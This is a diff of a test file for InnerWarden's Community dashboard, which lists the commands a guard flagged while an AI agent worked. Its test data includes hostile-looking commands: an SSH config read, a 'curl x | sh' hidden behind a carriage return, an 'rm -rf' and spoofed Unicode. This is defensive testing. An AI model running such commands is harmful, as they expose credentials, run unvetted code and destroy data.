@@ -14,7 +14,8 @@ import attemptsFixture from "../../tests/fixtures/community/history-attempts.jso
 import protectionFixture from "../../tests/fixtures/community/protection.json";
 import agentsFixture from "../../tests/fixtures/community/agents.json";
 import tokensFixture from "../../tests/fixtures/community/token-intelligence.json";
-import { readAttemptsPage, readDecisionDetail, readDecisionsPage, readHistory, readProtection, readRecordHealth } from "./api";
+import sessionsFixture from "../../tests/fixtures/community/sessions.json";
+import { readAttemptsPage, readDecisionDetail, readDecisionsPage, readHistory, readProtection, readRecordHealth, readSessionsPage } from "./api";
 
 /**
  * The Community pages, RENDERED from the CLI's fixtures, with each polled
@@ -24,16 +25,19 @@ import { readAttemptsPage, readDecisionDetail, readDecisionsPage, readHistory, r
 const answers = new Map<string, unknown>();
 const failing = new Set<string>();
 
+/** A failing source's error, when it is not the plain "unreadable". */
+const errors = new Map<string, Error>();
+
 function lookupOf(key: string): string {
   if (key.startsWith("{")) return key.includes("reasonNot") ? "decisions-hidden" : "decisions";
   if (key.startsWith("cmd:")) return `decision:${key}`;
-  if (key.startsWith("recent-without:")) return key === "recent-without:" ? "none" : "recent-without";
+  if (key.startsWith("reason-preview:")) return "reason-preview";
   return key;
 }
 
 function answered(key: string) {
   const lookup = lookupOf(key);
-  if (failing.has(lookup)) return { error: new Error("unreadable"), loading: false, stale: false, refresh: () => undefined };
+  if (failing.has(lookup)) return { error: errors.get(lookup) ?? new Error("unreadable"), loading: false, stale: false, refresh: () => undefined };
   const data = answers.get(lookup);
   return data === undefined
     ? { loading: true, stale: false, refresh: () => undefined }
@@ -50,7 +54,7 @@ vi.mock("./store", () => ({
 }));
 
 const { CommunityOverview } = await import("./Overview");
-const { CommunityCases } = await import("./Cases");
+const { CommunityDecisions, decisionsParams, emptyListWords, filterCode, toParams } = await import("./Decisions");
 const { CommunityProtection } = await import("./Protection");
 const { CommunityAgents } = await import("./Agents");
 const { CommunityTokens } = await import("./Tokens");
@@ -76,6 +80,10 @@ function context(search = "", meta: DashboardMeta = META, os = "macos"): Communi
 function seed() {
   answers.clear();
   failing.clear();
+  errors.clear();
+  answers.set("sessions-probe", { supported: true, value: readSessionsPage({ ...sessionsFixture, items: sessionsFixture.items.slice(0, 1) }) });
+  answers.set("sessions", { supported: true, value: readSessionsPage(sessionsFixture) });
+  answers.set("reason-preview", readDecisionsPage({ ...page1, items: page1.items.slice(0, 5) }));
   answers.set("overview", overviewFixture);
   answers.set("overview-record", overviewFixture);
   answers.set("recent-flagged", readDecisionsPage({ ...page1, items: page1.items.slice(0, 15) }));
@@ -193,7 +201,8 @@ type FixtureItem = { outcome_key: string; command: string; command_whole: boolea
 const BY_ID = byId as unknown as Record<string, { item: FixtureItem }>;
 const OPEN_CASES = Object.keys(BY_ID).filter((id) => BY_ID[id].item.outcome_key !== "allowed");
 const CASE_WOULD_REFUSE = page1.items.find((item) => item.command === "cat ~/.ssh/config")!.id;
-const caseHtml = (id: string) => render(<CommunityCases context={context(`?view=activity&decision=${encodeURIComponent(id)}`)} />);
+const decisions = (search: string) => render(<CommunityDecisions context={context(search)} />);
+const decisionHtml = (id: string) => decisions(`?view=activity&decision=${encodeURIComponent(id)}`);
 
 describe("the colour jobs, on every Community page", () => {
   for (const technical of [false, true]) {
@@ -201,13 +210,15 @@ describe("the colour jobs, on every Community page", () => {
       setTechnicalDetail(technical);
       const pages = [
         render(<CommunityOverview context={context()} />),
-        render(<CommunityCases context={context("?view=activity")} />),
+        decisions("?view=activity"),
+        decisions("?view=activity&lens=reason"),
+        decisions("?view=activity&lens=session"),
         render(<CommunityProtection context={context()} />),
         render(<CommunityAgents />),
         render(<CommunityTokens />),
-        render(<CommunityCases context={context("?view=activity&lane=agent_messages&decision=" + attemptsFixture.items[0].id)} />),
+        decisions("?view=activity&lane=agent_messages&decision=" + attemptsFixture.items[0].id),
       ];
-      for (const id of OPEN_CASES) pages.push(caseHtml(id));
+      for (const id of OPEN_CASES) pages.push(decisionHtml(id));
       for (const html of pages) expectColourJobs(html);
     });
   }
@@ -337,7 +348,7 @@ describe("the Overview", () => {
     expect(html.match(/data-reason-row=/g)).toHaveLength(4);
     for (const deny of DENIES.slice(0, 3)) expect(html).toContain(`href="?view=activity&amp;decision=${encodeURIComponent(deny.id)}"`);
     expect(html).toContain(`href="?view=activity&amp;reason=${encodeURIComponent("rule:tmp_execution")}"`);
-    expect(textOf(html)).toContain("See all 30 flagged in Cases");
+    expect(textOf(html)).toContain("See all 30 flagged in Decisions");
     expect(textOf(html)).not.toMatch(/\bHide\b/);
     expect(textOf(html)).toContain("From the decision record: newest 96 decisions, about 4 days.");
     // A row never shows a session id.
@@ -472,22 +483,57 @@ describe("the first run", () => {
   });
 });
 
-describe("Cases", () => {
-  it("counts the flagged decisions, splits them by outcome, and names the reasons", () => {
-    const html = render(<CommunityCases context={context("?view=activity")} />);
-    expect(html).toContain(`${page1.flagged_total}</span>`);
-    expect(html).toContain("Why they were flagged");
-    expect(html).toContain("world-writable folder");
-    expect(html).toContain(`25 rows on this page of ${page1.total}`);
-    expect(html).toContain("more in a row, flagged for the same reason");
+describe("Decisions", () => {
+  it("counts the flagged decisions, splits them by outcome, and lists the newest first", () => {
+    const html = decisions("?view=activity");
+    const text = textOf(html);
+    expect(html).toMatch(/<h1 id="decisions-title"[^>]*>Decisions<\/h1>/);
+    expect(text).toContain("Every command or tool call the guard flagged, from the decision record.");
+    expect(text).toContain("Newest 96 decisions, about 4 days.");
+    const bar = textOf(html.slice(html.indexOf("data-outcome-bar"), html.indexOf("data-tour=\"legend\"")));
+    expect(bar).toContain("Refused before it ran3");
+    expect(bar).toContain("Would have been refused6");
+    expect(bar).toContain("Judged unsafe, and it ran1");
+    expect(bar).toContain("Flagged, and it ran20");
+    expect(text).toContain(`25 rows on this page of ${page1.total}`);
+    expect(text).toContain("more in a row, flagged for the same reason");
     // The agent's own tab says its count too, the same figure.
-    expect(textOf(html)).toMatch(new RegExp(`What your AI agent did${page1.flagged_total}`));
+    expect(text).toMatch(new RegExp(`What your AI agent did${page1.flagged_total}`));
+    // The list flows with the page; the detail is the sticky one.
+    expect(html).toContain("lg:sticky");
+    expect(html).not.toContain("lg:overscroll-contain");
   });
 
   it("never prints a rule id where a reason's words go", () => {
-    const text = textOf(render(<CommunityCases context={context("?view=activity")} />));
+    const text = textOf(decisions("?view=activity&lens=reason"));
     expect(text).not.toMatch(/\[ATR-/);
     expect(text).toContain("high-risk tool invocation without human");
+  });
+
+  it("lists the reasons by the outcome most of them reached, with Hide, and the rarer ones one press away", () => {
+    const html = decisions("?view=activity&lens=reason");
+    expect(html.match(/data-reason-group=/g)).toHaveLength(8);
+    expect(textOf(html)).toContain("And 2 more reasons");
+    expect(textOf(html)).toContain("2 rarer reasons are not listed here.");
+    expect(html).toMatch(/aria-label="Hide world-writable folder from the newest list"/);
+    expect(html).toContain('aria-selected="true"');
+    expect(html).toMatch(/id="lens-tab-reason"[^>]*aria-selected="true"/);
+  });
+
+  it("lists the sessions with decisions in the record, each opening its own list", () => {
+    const html = decisions("?view=activity&lens=session");
+    expect(html.match(/data-session-row=/g)).toHaveLength(sessionsFixture.items.length);
+    expect(html).toContain(`href="?view=activity&amp;session=${encodeURIComponent(sessionsFixture.items[0].id)}"`);
+    expect(textOf(html)).toContain("Sessions with decisions still in the record.");
+  });
+
+  it("offers the session lens only where this InnerWarden lists sessions", () => {
+    expect(decisions("?view=activity")).toContain('data-lens="session"');
+    answers.set("sessions-probe", { supported: false });
+    const html = decisions("?view=activity&lens=session");
+    expect(html).not.toContain('data-lens="session"');
+    // An address that asked for it lands on the newest list.
+    expect(html).toMatch(/id="lens-tab-newest"[^>]*aria-selected="true"/);
   });
 
   /**
@@ -496,8 +542,8 @@ describe("Cases", () => {
    */
   it("prints a rule's quoted words as code, kept whole", () => {
     const credential = page1.items.find((item) => item.concern === "credential_read")!;
-    const detail = caseHtml(credential.id);
-    const story = detail.slice(detail.indexOf(">What happened</dt>"), detail.indexOf(">What InnerWarden did</dt>"));
+    const detail = decisionHtml(credential.id);
+    const story = detail.slice(detail.indexOf('data-part="happened"'), detail.indexOf('data-part="did"'));
     expect(textOf(story)).not.toContain("`");
     const codes = [...story.matchAll(/<code data-segment-code="" class="([^"]*)">([^<]*)<\/code>/g)];
     expect(codes.map((match) => match[2])).toContain("my-app");
@@ -507,20 +553,50 @@ describe("Cases", () => {
     expect(codes.some(([, , text]) => text.startsWith("."))).toBe(true);
   });
 
-  it("shows every case's three parts, in order, with what you can do", () => {
+  it("shows every decision's parts, in order, with no offer and no link out", () => {
     for (const id of OPEN_CASES) {
-      const html = caseHtml(id);
-      const detail = html.slice(html.indexOf('aria-labelledby="case-title"'));
-      const parts = ["What happened", "What InnerWarden did", "What you can do"].map((term) => detail.indexOf(`>${term}</dt>`));
+      const html = decisionHtml(id);
+      const detail = html.slice(html.indexOf('aria-labelledby="decision-title"'));
+      const parts = ['data-part="happened"', 'data-part="did"', 'data-part="next"'].map((part) => detail.indexOf(part));
       expect(parts.every((at) => at > 0), id).toBe(true);
       expect(parts, id).toEqual([...parts].sort((a, b) => a - b));
-      expect(links(html).length, id).toBeLessThanOrEqual(1);
+      expect(detail).toContain("data-not-checked-afterwards");
+      expect(links(html), id).toEqual([]);
+      expect(html, id).not.toContain("data-offer");
+      expect(html, id).not.toContain("data-ad-state");
     }
+  });
+
+  it("says what InnerWarden did in three steps, and that nothing was checked afterwards", () => {
+    const html = decisionHtml(CASE_WOULD_REFUSE);
+    expect([...html.matchAll(/data-stage="([a-z]+)" data-mark="([a-z_]+)"/g)].map((match) => [match[1], match[2]])).toEqual([
+      ["seen", "done"],
+      ["decided", "done"],
+      ["refused", "not_applicable"],
+    ]);
+    const text = textOf(html);
+    expect(text).toContain("Not refused: monitor records and does not refuse");
+    expect(text).toContain("Deny, by InnerWarden's rules");
+    expect(text).toContain("Not checked afterwards: Community does not look at what a command did after it ran.");
+    expect(text).toContain("Decided in monitor");
+    // The heading is what the guard did, as the CLI says it.
+    expect(html).toMatch(/<h2 id="decision-title"[^>]*>The rules said deny\./);
+  });
+
+  it("follows a step that changes an agent's config with that agent's restart words", () => {
+    const id = Object.keys(BY_ID).find((key) => BY_ID[key].item.next.some((step) => step.command === "innerwarden enforce"))!;
+    const html = decisionHtml(id);
+    const step = html.slice(html.lastIndexOf("<div data-step", html.indexOf(">innerwarden</span>")));
+    expect(textOf(step)).toMatch(/If (Claude Code|your agent) is running, restart it after this step\./);
+    expect(textOf(step)).toContain("An agent reads its hook or MCP config only when it starts.");
+    // An allow changes no agent config, and carries no restart.
+    const allow = decisionHtml(page1.items.find((item) => item.command === "bash /tmp/build-cache/run.sh --clean")!.id);
+    expect(allow).not.toContain("data-restart");
   });
 
   it("prints the CLI's commands exactly as sent", () => {
     const would = page1.items.find((item) => item.outcome_key === "would_have_refused")!;
-    const boxes = commandBoxes(caseHtml(would.id)).map((box) => box.text);
+    const boxes = commandBoxes(decisionHtml(would.id)).map((box) => box.text);
     for (const step of would.next) {
       if ("command" in step && step.command !== undefined) expect(boxes).toContain(step.command);
     }
@@ -537,7 +613,7 @@ describe("Cases", () => {
     let notWhole = 0;
     for (const id of OPEN_CASES) {
       const item = BY_ID[id].item;
-      for (const box of commandBoxes(caseHtml(id))) {
+      for (const box of commandBoxes(decisionHtml(id))) {
         if (box.template || /<[^<>]+>/.test(box.text)) {
           templates += 1;
           expect(box.copy, `${id}: ${box.text}`).toBe(false);
@@ -555,24 +631,33 @@ describe("Cases", () => {
 
   it("says why a shortened or revealed command has nothing to copy", () => {
     const revealed = Object.keys(BY_ID).find((id) => BY_ID[id].item.command.includes("\\u{202E}"))!;
-    const html = caseHtml(revealed);
+    const html = decisionHtml(revealed);
     expect(html).toContain("Contains hidden characters");
     expect(html).toContain("Shown with its hidden characters written out, so there is nothing whole to copy.");
   });
 
   it("offers to hide a per-session scratch script's reason from the list, never an allow that cannot match", () => {
     const scratch = Object.keys(BY_ID).find((id) => BY_ID[id].item.command.includes("/agent-scratch/"))!;
-    const html = caseHtml(scratch);
+    const html = decisionHtml(scratch);
     expect(html).toContain('data-hide-reason="rule:tmp_execution"');
     expect(commandBoxes(html).some((box) => box.text.startsWith("innerwarden allow"))).toBe(false);
   });
 
   it("lists a hidden reason's view: the count without it, and a way back", () => {
     answers.set("decisions-hidden", readDecisionsPage({ ...page1, total: 15, items: page1.items.filter((item) => item.reason.key !== "rule:tmp_execution") }));
-    const html = render(<CommunityCases context={context("?view=activity&hide=rule%3Atmp_execution")} />);
+    const html = decisions("?view=activity&hide=rule%3Atmp_execution");
     expect(textOf(html)).toContain("15 flagged without world-writable folder");
     expect(html).toContain("Show them again");
     expect(html).not.toContain("/tmp/build-cache/run.sh");
+  });
+
+  it("shows an active reason and session as filters a press removes", () => {
+    const html = decisions("?view=activity&reason=rule%3Atmp_execution&session=4b1d9c2e-demo-4000-8000-000000000001");
+    expect(textOf(html)).toContain("Reason: world-writable folder");
+    expect(textOf(html)).toContain("Session 4b1d9c2e");
+    expect(html).toContain('aria-label="Remove the reason filter"');
+    expect(html).toContain('aria-label="Remove the session filter"');
+    expect(textOf(html)).not.toMatch(/4b1d9c2e-demo-4000/);
   });
 
   /**
@@ -584,48 +669,39 @@ describe("Cases", () => {
       ...page1,
       items: page1.items.slice(0, 3).map((item, index) => ({
         ...item,
-        command: ["ls ‮malicious", "rm -rf ~/x # ​", "ls\rcurl x | sh # \u{E0041}"][index],
+        command: ["ls \u202Emalicious", "rm -rf ~/x # \u200B", "ls\rcurl x | sh # \u{E0041}"][index],
       })),
     };
     answers.set("decisions", readDecisionsPage(raw));
-    const html = render(<CommunityCases context={context("?view=activity")} />);
-    expect(html.match(/data-case-row=/g)?.length).toBe(3);
+    const html = decisions("?view=activity");
+    expect(html.match(/data-decision-row=/g)?.length).toBe(3);
     expect(html.match(/data-hidden-characters=/g)?.length).toBe(3);
     expect(html).toContain("ls \\u{202E}malicious");
     expect(html).not.toContain("Nothing flagged");
   });
 
-  it("names Secret Read Guard only on a case that reached for a credential", () => {
-    const credential = page1.items.find((item) => item.concern === "credential_read" && item.outcome_key === "would_have_refused")!;
-    const other = page1.items.find((item) => item.concern === "other" && item.outcome_key === "flagged_ran")!;
-    expect(caseHtml(credential.id)).toContain("Secret Read Guard");
-    const html = caseHtml(other.id);
-    expect(html).not.toContain("Secret Read Guard");
-    expect(html).toContain("Execution Gate");
-  });
-
-  it("puts an offer under the case, as one short line, never inside it", () => {
-    const other = page1.items.find((item) => item.concern === "other" && item.outcome_key === "flagged_ran")!;
-    const html = caseHtml(other.id);
-    const card = html.slice(html.indexOf('data-case="'), html.indexOf("</section>", html.indexOf('data-case="')));
-    expect(card).not.toContain("data-offer");
-    expect(html).toContain('data-offer="execution_gate"');
-    // A text link, not a button that outweighs the reader's own Copy.
-    const offer = html.slice(html.indexOf('data-offer="execution_gate"'));
-    expect(offer.slice(0, offer.indexOf("</aside>"))).not.toMatch(/<a[^>]*class="[^"]*border/);
+  it("draws a row's command whole, clamped from the end, with a plain leading cd muted", () => {
+    const item = { ...page1.items[0], command: "cd /Users/me/my-app && rm -rf node_modules/.cache" };
+    answers.set("decisions", readDecisionsPage({ ...page1, items: [item] }));
+    const html = decisions("?view=activity");
+    const code = html.match(/<code title="([^"]*)" data-command-text[^>]*class="([^"]*)">([\s\S]*?)<\/code>/)!;
+    expect(textOf(code[1])).toBe(item.command);
+    expect(code[2]).toContain("line-clamp-2");
+    expect(textOf(code[3])).toBe(item.command);
+    expect(code[3]).toContain('<span data-muted="true" class="text-(--iw-ink-3)">cd /Users/me/my-app &amp;&amp; </span>');
   });
 
   it("names the agent of a session only when the record names it", () => {
-    const named = caseHtml("cmd:4b1d9c2e-demo-4000-8000-000000000001:63");
+    const named = decisionHtml("cmd:4b1d9c2e-demo-4000-8000-000000000001:63");
     expect(named).toContain("In a session of Claude Code (4b1d9c2e)");
     answers.set("decision:cmd:local:0", readDecisionDetail(BY_ID["cmd:local:0"]));
-    const checked = caseHtml("cmd:local:0");
+    const checked = decisionHtml("cmd:local:0");
     expect(checked).toContain("In this session (local)");
     expect(checked).not.toContain("In a session of You");
   });
 
   it("says each neighbour's outcome in words at every width, for a screen reader", () => {
-    const html = caseHtml("cmd:4b1d9c2e-demo-4000-8000-000000000001:63");
+    const html = decisionHtml("cmd:4b1d9c2e-demo-4000-8000-000000000001:63");
     const around = html.slice(html.indexOf('id="around-title"'));
     const rows = around.match(/data-outcome-words="[a-z_]+"[^>]*class="([^"]*)"/g) ?? [];
     expect(rows.length).toBeGreaterThan(0);
@@ -636,67 +712,105 @@ describe("Cases", () => {
     }
   });
 
-  /** FAILS ON REVERT: an outcome the record does not hold was titled "ran". */
-  it("says an agent ran a command only where the record says it ran", async () => {
-    const { caseTitle } = await import("./CaseDetail");
-    expect(caseTitle({ agent: "Claude Code", channel: "hook", outcomeKey: "unplaced" })).toBe("Claude Code tried a command the guard flagged");
-    expect(caseTitle({ channel: "mcp", outcomeKey: "unplaced" })).toBe("An agent tried a tool call the guard flagged");
-    expect(caseTitle({ agent: "Claude Code", channel: "hook", outcomeKey: "flagged_ran" })).toBe("Claude Code ran a command the guard flagged");
-    const unplaced = { ...BY_ID[CASE_WOULD_REFUSE] };
-    answers.set(`decision:${CASE_WOULD_REFUSE}`, readDecisionDetail({ ...unplaced, item: { ...unplaced.item, outcome_key: "unplaced" } }));
-    const html = caseHtml(CASE_WOULD_REFUSE);
-    expect(html).toContain("tried a command the guard flagged");
-    expect(html).not.toContain(" ran a command the guard flagged");
+  it("offers Back to decisions on a phone, above the open decision", () => {
+    const html = decisionHtml(CASE_WOULD_REFUSE);
+    expect(html.indexOf("Back to decisions")).toBeGreaterThan(-1);
+    expect(html.indexOf("Back to decisions")).toBeLessThan(html.indexOf('aria-labelledby="decision-title"'));
+    expect(html).toMatch(/class="[^"]*lg:hidden[^"]*"[^>]*>.*Back to decisions/);
+    expect(decisions("?view=activity")).not.toContain("Back to decisions");
   });
 
-  it("says a case the record dropped is gone, and why", () => {
+  it("says a decision the record dropped is gone, and why", () => {
     answers.set("decision:cmd:gone:1", "decision_not_in_record");
-    const html = render(<CommunityCases context={context("?view=activity&decision=cmd%3Agone%3A1")} />);
-    expect(html).toContain("This case is no longer in the record");
+    const html = decisions("?view=activity&decision=cmd%3Agone%3A1");
+    expect(html).toContain("This decision is no longer in the record");
+    expect(html).toContain("InnerWarden keeps the newest decisions, and this one has been dropped.");
   });
 
   it("says a list that could not be read, never that nothing was flagged", () => {
     failing.add("decisions");
-    const html = render(<CommunityCases context={context("?view=activity")} />);
-    expect(html).toContain("The decision record could not be read");
+    const html = decisions("?view=activity");
+    expect(html).toMatch(/role="alert"[^>]*>[\s\S]*The decision record could not be read/);
+    expect(html).toContain("Try again");
     expect(html).not.toContain("Nothing flagged");
   });
 
+  it("says a filter the server would not take, by its own code", () => {
+    failing.add("decisions");
+    errors.set("decisions", new Error("outcome_invalid"));
+    const text = textOf(decisions("?view=activity&outcome=flagged_ran"));
+    expect(text).toContain("That filter is not valid here (outcome_invalid).");
+    expect(text).toContain("Clear filters");
+    expect(filterCode(new Error("graph_unreadable"))).toBeUndefined();
+    expect(filterCode("outcome_invalid")).toBeUndefined();
+  });
+
+  it("says the empty record and a record with nothing flagged apart, from the record's own counts", () => {
+    const page = readDecisionsPage(page1);
+    expect(emptyListWords({ ...page, flaggedTotal: 0, total: 0, record: { decisions: 0, flagged: 0, checked: 0 } }, false))
+      .toBe("Nothing recorded yet. Connect an agent and ask it to run something.");
+    expect(emptyListWords({ ...page, flaggedTotal: 0, total: 0 }, false)).toMatch(/^Nothing flagged in the record \(25 Sept, \d\d:34 to now\)\.$/);
+    expect(emptyListWords({ ...page, total: 0 }, true)).toBe("No decision matches these filters.");
+    expect(emptyListWords(page, false)).toBe("30 flagged could not be shown.");
+  });
+
+  it("reads the address back the way it writes it, and never writes the default lens", () => {
+    const search = "?view=activity&lens=reason&outcome=flagged_ran&hide=rule%3Atmp_execution&q=curl";
+    const state = decisionsParams(search);
+    expect(state).toMatchObject({ lane: "agent_actions", lens: "reason", query: { outcome: "flagged_ran", reasonNot: "rule:tmp_execution", q: "curl" } });
+    expect(toParams(state)).toEqual({ lens: "reason", outcome: "flagged_ran", hide: "rule:tmp_execution", q: "curl" });
+    expect(toParams(decisionsParams("?view=activity&lens=newest"))).toEqual({});
+    expect(decisionsParams("?view=activity&lens=nonsense").lens).toBe("newest");
+    expect(decisionsParams("?view=activity&outcome=allowed&decision=x").query.outcome).toBe("allowed");
+    expect(decisionsParams("?view=activity&outcome=bogus").query.outcome).toBeUndefined();
+  });
+
   it("offers the messages tab, and no attacks or Everything tab", () => {
-    const html = render(<CommunityCases context={context("?view=activity")} />);
+    const html = decisions("?view=activity");
     expect(html).toContain('data-lane="agent_messages"');
     expect(html).not.toContain('data-lane="server_attacks"');
     expect(html).not.toContain('data-lane="everything"');
+  });
+
+  it("offers the messages tab only where messages can be or were recorded", () => {
+    const history = readHistory(historyFixture);
+    answers.set("history", { ...history, messages: { ...history.messages, recorded: 0 } });
+    answers.set("protection", { ...readProtection(protectionFixture), observe: { installed: false, available: false } });
+    expect(decisions("?view=activity")).not.toContain('data-lane="agent_messages"');
+    answers.set("protection", { ...readProtection(protectionFixture), observe: { installed: false, available: true } });
+    expect(decisions("?view=activity")).toContain('data-lane="agent_messages"');
   });
 });
 
 describe("a message someone sent the agent", () => {
   const first = attemptsFixture.items[0];
-  const open = (search: string) => render(<CommunityCases context={context(search)} />);
 
-  it("gives a real Community step first, then the offer as one line under the case", () => {
-    const html = open(`?view=activity&lane=agent_messages&decision=${first.id}`);
+  it("gives a real Community step, and no offer", () => {
+    const html = decisions(`?view=activity&lane=agent_messages&decision=${first.id}`);
     const text = textOf(html);
     expect(text).toContain("If your agent had obeyed, the guard would have screened what it ran.");
     expect(commandBoxes(html).map((box) => box.text)).toContain("innerwarden enforce");
-    expect(text.indexOf("What you can do")).toBeLessThan(text.indexOf("Observe records; it cannot stop"));
+    expect(text).toContain("If your agent is running, restart it after this step.");
+    expect(html).not.toContain("data-offer");
+    expect(links(html)).toEqual([]);
     expect(html).toContain("Contains hidden characters");
   });
 
-  it("makes no offer for a message InnerWarden stopped", () => {
+  it("says there is nothing to do for a message InnerWarden stopped", () => {
     const stopped = { ...attemptsFixture, items: [{ ...first, outcome_key: "stopped_by_innerwarden" }] };
     answers.set("", readAttemptsPage(stopped));
-    const html = open(`?view=activity&lane=agent_messages&decision=${first.id}`);
+    const html = decisions(`?view=activity&lane=agent_messages&decision=${first.id}`);
     expect(html).not.toContain("data-offer");
     expect(textOf(html)).toContain("Nothing to do: InnerWarden stopped it.");
   });
 
   it("says the lane's own words, and the count's span, never a zero it did not read", () => {
-    const html = open("?view=activity&lane=agent_messages");
-    expect(textOf(html)).toContain("Risky messages people sent your agent, one case each");
-    expect(textOf(html)).toContain(`${attemptsFixture.total} recorded since 30 Jul 2026`);
+    const html = decisions("?view=activity&lane=agent_messages");
+    expect(textOf(html)).toContain("Risky messages people sent your agent, from the guard's log");
+    expect(textOf(html)).toContain(`${attemptsFixture.total} recorded since 30 Jul 2026.`);
+    expect(html.match(/data-message-row=/g)?.length).toBe(attemptsFixture.items.length);
     answers.delete("");
-    expect(textOf(open("?view=activity&lane=agent_messages"))).not.toContain("0 recorded");
+    expect(textOf(decisions("?view=activity&lane=agent_messages"))).not.toContain("0 recorded");
   });
 });
 
